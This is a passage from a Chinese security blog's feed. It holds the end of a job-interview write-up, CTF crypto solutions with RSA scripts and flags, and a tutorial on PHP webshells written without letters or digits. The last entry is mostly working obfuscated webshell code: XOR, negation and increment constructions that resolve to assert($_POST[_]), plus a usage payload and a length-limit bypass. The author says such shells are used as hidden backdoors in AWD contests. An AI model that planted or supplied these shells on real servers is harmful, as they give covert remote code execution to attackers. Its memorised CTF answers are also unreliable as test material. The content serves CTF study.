title="笔试"></a>笔试</h3><p>华为这次笔试感觉真的难，只有单选，不定项选(少选不给分)，和一道编程题</p><ol><li>fuzz框架考了很多，而且都是问用处，但是我都不知道</li><li>Linux的操作也考了一些，比如 <code>/etc/profile</code> 文件中设置的环境变量对所有用户都生效</li><li>web安全，有直接给源码问你漏洞点的，还有一些基本概念，这个反倒是不难</li><li>二进制安全，有一道直接考ROP链的，让你选择栈布局</li></ol><p>不知道还有没有后续的面试</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>校招还是比较看重基础，但是对于偏乙方的比如长亭和知道创宇可能要求你有一些比较擅长的点，而且会问的比较细。大厂主要是看你的基础知识是不是很扎实。感觉面试的很多问题都是可以直接从网上找到答案的，但是还是要拿来问emmm。最后，感觉面试真是3分运气，7分实力，不过不到最后也不要轻言放弃，万一呢，万一呢。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;从2月到4月，中间大大小小经历了20次左右的面试，最后选择去腾讯WXG的后台策略安全岗&lt;/p&gt;
&lt;h2 id=&quot;长亭&quot;&gt;&lt;a href=&quot;#长亭&quot; class=&quot;headerlink&quot; title=&quot;长亭&quot;&gt;&lt;/a&gt;长亭&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;自我介绍&lt;/li&gt;
&lt;li
      
    
    </summary>
    
    
      <category term="生活" scheme="https://prontosil.me/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="面经" scheme="https://prontosil.me/tags/%E9%9D%A2%E7%BB%8F/"/>
    
  </entry>
  
  <entry>
    <title>密码学题目</title>
    <link href="https://prontosil.me/posts/1dea6763/"/>
    <id>https://prontosil.me/posts/1dea6763/</id>
    <published>2020-04-18T07:21:05.000Z</published>
    <updated>2020-06-06T06:06:56.793Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下ctf.show平台</p><p><a href="https://ctf.show/challenges" target="_blank" rel="noopener">https://ctf.show/challenges</a></p><h2 id="crypto0"><a href="#crypto0" class="headerlink" title="crypto0"></a>crypto0</h2><p>凯撒密码</p><p><img src= "/img/loading.gif" data-src="/posts/1dea6763/1586531882516-1587195417553.png" alt></p><h2 id="crypto2"><a href="#crypto2" class="headerlink" title="crypto2"></a>crypto2</h2><p>jsfuck</p><p><img src= "/img/loading.gif" data-src="/posts/1dea6763/1587194700279.png" alt></p><h2 id="crypto3"><a href="#crypto3" class="headerlink" title="crypto3"></a>crypto3</h2><p>还是jsfuck编码</p><p><img src= "/img/loading.gif" data-src="/posts/1dea6763/1587194728413.png" alt></p><h2 id="crypto4"><a href="#crypto4" class="headerlink" title="crypto4"></a>crypto4</h2><p>p=447685307 q=2037 e=17</p><p>提交flag{d}即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">给出p,q,e 求d</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># p = 3487583947589437589237958723892346254777</span></span><br><span class="line"><span class="comment"># q = 8767867843568934765983476584376578389</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line">p=<span class="number">18443</span></span><br><span class="line">q=<span class="number">49891</span></span><br><span class="line">e=<span class="number">19</span></span><br><span class="line">phin = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> gmpy2.invert(e, phin)</span><br></pre></td></tr></table></figure><h2 id="crypto5"><a href="#crypto5" class="headerlink" title="crypto5"></a>crypto5</h2><p>p=447685307 q=2037 e=17 c=704796792</p><p>提交flag{m}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">给出p,q,e,c 求d和m</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">p=<span class="number">447685307</span></span><br><span class="line">q=<span class="number">2037</span></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">c=<span class="number">704796792</span></span><br><span class="line">phin = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phin)</span><br><span class="line"><span class="keyword">print</span> pow(c,d,p*q)</span><br></pre></td></tr></table></figure><h2 id="crypto7"><a href="#crypto7" class="headerlink" title="crypto7"></a>crypto7</h2><p>ook解密</p><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b615c4b79a1aede83b9ae67104ff4eb5&#125;</span><br></pre></td></tr></table></figure><h2 id="crypto8"><a href="#crypto8" class="headerlink" title="crypto8"></a>crypto8</h2><p>brainfuck解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;99754106633f94d350db34d548d6091a&#125;</span><br></pre></td></tr></table></figure><h2 id="crypto9"><a href="#crypto9" class="headerlink" title="crypto9"></a>crypto9</h2><p>密码是4132</p><p><a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">http://serpent.online-domain-tools.com/</a></p><p><img src= "/img/loading.gif" data-src="/posts/1dea6763/1586560529022.png" alt></p><h2 id="crypto10"><a href="#crypto10" class="headerlink" title="crypto10"></a>crypto10</h2><p>邮件编码</p><h2 id="crypto11"><a href="#crypto11" class="headerlink" title="crypto11"></a>crypto11</h2><p>解密后就是ctf</p><h2 id="crypto13"><a href="#crypto13" class="headerlink" title="crypto13"></a>crypto13</h2><p>混合加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = base64.b32decode(s)</span><br><span class="line">        s = base(s)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s = base64.b64decode(s)</span><br><span class="line">            s = base(s)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line">f = open(<span class="string">'base.txt'</span>)</span><br><span class="line"></span><br><span class="line">text = f.read()</span><br><span class="line"></span><br><span class="line">print(base(text))</span><br></pre></td></tr></table></figure><p>flag{b4Se_Fami1y_Is_FUn}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;记录一下ctf.show平台&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://ctf.show/challenges&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://ctf.show/challenges&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;cr
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://prontosil.me/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://prontosil.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>无字母数字webshell</title>
    <link href="https://prontosil.me/posts/bed5b94f/"/>
    <id>https://prontosil.me/posts/bed5b94f/</id>
    <published>2020-04-05T08:08:20.000Z</published>
    <updated>2020-07-01T13:46:25.493Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9]/is'</span>,$_GET[<span class="string">'shell'</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">'shell'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="通过异或"><a href="#通过异或" class="headerlink" title="通过异或"></a>通过异或</h2><p>原理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">echo</span> chr(<span class="number">0x01</span>)^<span class="string">'`'</span>;</span><br><span class="line">a</span><br><span class="line">php &gt; <span class="keyword">echo</span> chr(<span class="number">0x13</span>)^<span class="string">'`'</span>;</span><br><span class="line">s</span><br><span class="line">php &gt; <span class="keyword">echo</span> chr(<span class="number">0x05</span>)^<span class="string">'`'</span>;</span><br><span class="line">e</span><br></pre></td></tr></table></figure><p>所以即可构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_=(<span class="string">'%01'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%05'</span>^<span class="string">'`'</span>).(<span class="string">'%12'</span>^<span class="string">'`'</span>).(<span class="string">'%14'</span>^<span class="string">'`'</span>); <span class="comment">//$_=assert</span></span><br><span class="line">$__=<span class="string">'_'</span>.(<span class="string">'%0D'</span>^<span class="string">']'</span>).(<span class="string">'%2F'</span>^<span class="string">'`'</span>).(<span class="string">'%0E'</span>^<span class="string">']'</span>).(<span class="string">'%09'</span>^<span class="string">']'</span>); <span class="comment">// $__ = _POST</span></span><br><span class="line">$___=$$__; <span class="comment">//$___ = $_POST</span></span><br><span class="line">$_($___[_]);<span class="comment">// assert($_POST[_])</span></span><br></pre></td></tr></table></figure><p>在 <code>php5.5.38</code> 通过测试</p><p><img src= "/img/loading.gif" data-src="/posts/bed5b94f/1586074270072.png" alt></p><p>但是如果切换为 <code>php7.1.3</code> 执行失败</p><p><img src= "/img/loading.gif" data-src="/posts/bed5b94f/1586074316094.png" alt></p><h3 id="构造webshell"><a href="#构造webshell" class="headerlink" title="构造webshell"></a>构造webshell</h3><p>通过这种方式可以构造异或形式的webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @$_++; <span class="comment">// $_ = 1</span></span><br><span class="line">    $__=(<span class="string">"#"</span>^<span class="string">"|"</span>); <span class="comment">// $__ = _</span></span><br><span class="line">    $__.=(<span class="string">"."</span>^<span class="string">"~"</span>); <span class="comment">// _P</span></span><br><span class="line">    $__.=(<span class="string">"/"</span>^<span class="string">"`"</span>); <span class="comment">// _PO</span></span><br><span class="line">    $__.=(<span class="string">"|"</span>^<span class="string">"/"</span>); <span class="comment">// _POS</span></span><br><span class="line">    $__.=(<span class="string">"&#123;"</span>^<span class="string">"/"</span>); <span class="comment">// _POST </span></span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); <span class="comment">// $_POST[0]($_POST[1]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x3D;assert&amp;1&#x3D;phpinfo()</span><br></pre></td></tr></table></figure><p>在 AWD 中常用来做隐藏的shell</p><p><img src= "/img/loading.gif" data-src="/posts/bed5b94f/1586074779485.png" alt></p><p>当然这种马是直接被杀的</p><p><img src= "/img/loading.gif" data-src="/posts/bed5b94f/1586074826727.png" alt></p><h3 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先我们得知道 <code>_GET</code> 由什么异或而来的，<a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#_12" target="_blank" rel="noopener">参考</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;&#x2F;&#x2F;_GET</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这段代码一大坨是啥意思呢？因为 40 个字符长度的限制，导致以前逐个字符异或拼接的 webshell 不能使用。<br>这里可以使用 php 中可以执行命令的反引号 ``` 和 <code>Linux</code> 下面的通配符 <code>?</code></p><ul><li><code>?</code> 代表匹配一个字符</li><li>``` 表示执行命令</li><li><code>&quot;</code> 对特殊字符串进行解析</li></ul><p>这样就可以直接得到 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; echo &quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;</span><br><span class="line">_GET</span><br></pre></td></tr></table></figure><p>然后再构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$_&#125;[_]($&#123;$_&#125;[__]) &#x2F;&#x2F;$_GET[_]($_GET[__])</span><br></pre></td></tr></table></figure><p>这样就构造好了shell</p><p><img src= "/img/loading.gif" data-src="/posts/bed5b94f/1586075401555.png" alt></p><h2 id="通过取反"><a href="#通过取反" class="headerlink" title="通过取反"></a>通过取反</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$__=(<span class="string">'&gt;'</span>&gt;<span class="string">'&lt;'</span>)+(<span class="string">'&gt;'</span>&gt;<span class="string">'&lt;'</span>);</span><br><span class="line">$_=$__/$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">''</span>;</span><br><span class="line">$___=<span class="string">"瞰"</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">"和"</span>;$____.=~($___&#123;$__&#125;);$___=<span class="string">"和"</span>;$____.=~($___&#123;$__&#125;);$___=<span class="string">"的"</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">"半"</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">"始"</span>;$____.=~($___&#123;$__&#125;);</span><br><span class="line"></span><br><span class="line">$_____=<span class="string">'_'</span>;$___=<span class="string">"俯"</span>;$_____.=~($___&#123;$__&#125;);$___=<span class="string">"瞰"</span>;$_____.=~($___&#123;$__&#125;);$___=<span class="string">"次"</span>;$_____.=~($___&#123;$_&#125;);$___=<span class="string">"站"</span>;$_____.=~($___&#123;$_&#125;);</span><br><span class="line"></span><br><span class="line">$_=$$_____;</span><br><span class="line">$____($_[$__]);</span><br></pre></td></tr></table></figure><h2 id="通过加法运算"><a href="#通过加法运算" class="headerlink" title="通过加法运算"></a>通过加法运算</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=[];</span><br><span class="line">$_=@<span class="string">"$_"</span>; <span class="comment">// $_='Array';</span></span><br><span class="line">$_=$_[<span class="string">'!'</span>==<span class="string">'@'</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line">$___=$_; <span class="comment">// A</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; <span class="comment">// E </span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// R</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">'_'</span>;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// P</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// O</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// S</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://prontosil.me/categories/CTF/"/>
    
    
      <category term="webshell" scheme="https://prontosil.me/tags/webshell/"/>
    
  </entry>
  
</feed>
